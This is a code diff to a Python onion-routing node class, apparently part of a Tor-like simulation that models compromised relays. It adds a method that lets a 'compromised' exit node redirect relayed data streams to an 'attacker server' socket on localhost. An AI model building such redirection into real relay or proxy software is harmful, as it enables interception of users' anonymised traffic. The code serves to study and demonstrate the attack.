@@ -30,6 +30,7 @@ class Node:
         self.port = port
         self.server_socket: Optional[socket.socket] = None
         self.running = False
+        self.redirection = False
 
         self.routing_table: List[RoutingEntry] = []
         self.persistent_connections: Dict[str, socket.socket] = {}
@@ -245,6 +246,7 @@ class Node:
 
         created_cell = TorCell(circid=new_routing_entry.get_in_circ_id(), cmd=TorCommands.CREATED,
                               data=encode_payload([data_to_bytes(g_y1), H_K]))
+
         return created_cell.to_bytes()
     
 
@@ -267,12 +269,6 @@ class Node:
                     time.sleep(delay)
         finally:
             sock.close()
-
-               
-           
-               
-              
-         
 
     def _handle_created(self, cell,ip, port):
         
@@ -349,8 +345,26 @@ class Node:
             elif relay_decrypted == RelayCommands.BEGIN:
                 return self._connect_to_server(routing_entry, streamid_decrypted, payload_decrypted, ip, port)
             elif relay_decrypted == RelayCommands.DATA:
- 
-                dst_socket = self.circuit_stream_socket_map.get((routing_entry.get_in_circ_id(), int.from_bytes(streamid_decrypted)))
+
+                if self.redirection:
+                    destination_key = f"127.0.0.1:{self.attacker_server_port}"
+
+                    if destination_key not in self.persistent_connections:
+                        try:
+                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            sock.settimeout(2)  # avoid hanging forever
+                            sock.connect(("127.0.0.1", self.attacker_server_port))
+                            self.persistent_connections[destination_key] = sock
+                            self.logger.info(f"[Exit {self.id}] Connected redirect socket to {destination_key}")
+                        except Exception as e:
+                            self.logger.error(f"[Exit {self.id}] Redirect connection failed: {e}")
+                            return None
+
+                    dst_socket = self.persistent_connections[destination_key]
+
+                else:
+                    dst_socket = self.circuit_stream_socket_map.get((routing_entry.get_in_circ_id(), int.from_bytes(streamid_decrypted)))
+                    
                 if self.compromised:
                         self.compromised_log()
                         
@@ -494,3 +508,11 @@ class Node:
                 if candidate not in used:
                     return candidate
             raise RuntimeError("No free circ_id")
+        
+    def set_exit_redirection(self, redirection, attacker_server_ip, attacker_server_port):
+        if self.type == 'exit' and self.compromised:
+            self.redirection = redirection
+            self.attacker_server_ip = attacker_server_ip
+            self.attacker_server_port = attacker_server_port
+            
+            
